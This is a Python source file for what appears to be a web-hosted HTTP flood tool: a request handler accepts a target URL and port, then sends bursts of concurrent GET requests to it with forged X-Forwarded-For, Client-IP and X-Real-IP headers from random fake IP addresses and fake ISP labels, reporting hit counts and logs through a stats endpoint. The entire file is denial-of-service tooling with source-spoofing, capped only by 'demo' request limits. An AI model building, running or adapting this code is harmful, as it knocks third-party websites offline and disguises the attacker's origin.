from http.server import BaseHTTPRequestHandler
import json
import asyncio
import aiohttp
import random
import time
import uuid
from urllib.parse import parse_qs, urlparse

# Store active attacks
active_attacks = {}
attack_logs = {}
attack_stats = {}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        if 'action' in query and query['action'][0] == 'stats' and 'id' in query:
            attack_id = query['id'][0]
            
            if attack_id in active_attacks:
                logs = attack_logs.get(attack_id, [])[-50:]
                response = {
                    'success': True,
                    'stats': attack_stats.get(attack_id, {
                        'total': 0, 'success': 0, 'failed': 0
                    }),
                    'logs': logs
                }
            else:
                response = {'success': False, 'error': 'Attack not found'}
        else:
            response = {'success': False, 'error': 'Invalid request'}
        
        self.wfile.write(json.dumps(response).encode())
        return
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        action = data.get('action')
        
        if action == 'start':
            attack_id = str(uuid.uuid4())[:8]
            
            active_attacks[attack_id] = {
                'active': True,
                'params': data,
                'start_time': time.time()
            }
            
            attack_stats[attack_id] = {
                'total': 0, 'success': 0, 'failed': 0
            }
            
            attack_logs[attack_id] = []
            
            # Start attack in background
            asyncio.create_task(run_attack(attack_id, data))
            
            response = {'success': True, 'attackId': attack_id}
            
        elif action == 'stop':
            attack_id = data.get('id')
            if attack_id in active_attacks:
                active_attacks[attack_id]['active'] = False
            response = {'success': True}
        else:
            response = {'success': False, 'error': 'Invalid action'}
        
        self.wfile.write(json.dumps(response).encode())
        return
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

async def run_attack(attack_id, params):
    target = params.get('target', '')
    port = params.get('port', '')
    mode = params.get('mode', '1')
    req_count = int(params.get('reqCount', 100))
    concurrency = int(params.get('concurrency', 5))
    logging_enabled = params.get('logging') == 'Y'
    
    # Format URL
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    if port:
        target = f"{target}:{port}"
    
    url = target
    
    # Semaphore for concurrency control
    sem = asyncio.Semaphore(concurrency)
    
    async def send_request():
        async with sem:
            if not active_attacks.get(attack_id, {}).get('active', False):
                return
            
            fake_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            fake_isp = random.choice(["IndiHome", "Telkomsel", "XL", "3", "Smartfren"])
            fake_network = random.choice(["4G", "5G", "Fiber"])
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "X-Forwarded-For": fake_ip,
                "Client-IP": fake_ip,
                "X-Real-IP": fake_ip,
            }
            
            try:
                connector = aiohttp.TCPConnector(ssl=False)
                timeout = aiohttp.ClientTimeout(total=10)
                
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    async with session.get(url, headers=headers, timeout=5) as resp:
                        await resp.read()
                        
                        attack_stats[attack_id]['total'] += 1
                        if 200 <= resp.status < 300:
                            attack_stats[attack_id]['success'] += 1
                            status_text = f"Status {resp.status}"
                        else:
                            attack_stats[attack_id]['failed'] += 1
                            status_text = f"HTTP {resp.status}"
                        
                        if logging_enabled:
                            log_msg = f"{url} --> {status_text} | IP: {fake_ip} | ISP: {fake_isp}"
                            attack_logs[attack_id].append(log_msg)
                            
            except Exception as e:
                attack_stats[attack_id]['total'] += 1
                attack_stats[attack_id]['failed'] += 1
                if logging_enabled:
                    attack_logs[attack_id].append(f"{url} --> ERROR: {str(e)[:50]} | IP: {fake_ip}")
    
    # Run attack
    tasks = []
    if mode == "1":  # Infinite
        request_count = 0
        while active_attacks.get(attack_id, {}).get('active', False) and request_count < 100:  # Limit for demo
            task = asyncio.create_task(send_request())
            tasks.append(task)
            request_count += 1
            await asyncio.sleep(0.1)
    else:  # Custom
        for i in range(min(req_count, 50)):  # Max 50 requests for demo
            if not active_attacks.get(attack_id, {}).get('active', False):
                break
            task = asyncio.create_task(send_request())
            tasks.append(task)
            await asyncio.sleep(0.1)
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    
    # Cleanup
    if attack_id in active_attacks:
        active_attacks[attack_id]['active'] = False
    
    if logging_enabled:
        attack_logs[attack_id].append(f"[SYSTEM] Attack completed. Total: {attack_stats[attack_id]['total']}")
